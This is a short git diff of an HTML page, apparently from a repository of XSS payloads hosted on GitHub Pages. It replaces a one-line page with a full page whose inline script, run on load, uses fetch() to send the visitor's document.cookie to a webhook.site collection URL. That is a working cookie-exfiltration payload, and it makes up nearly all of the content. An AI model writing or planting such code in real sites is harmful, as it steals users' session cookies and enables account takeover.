@@ -1,2 +1,13 @@
-<h1>XSS Payloads Repo</h1>
-<script src="payload.js"></script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Payload Test</title>
+</head>
+<body>
+  <h1>Hello from GitHub Pages</h1>
+
+  <script>
+    fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?c=" + encodeURIComponent(document.cookie));
+  </script>
+</body>
+</html>
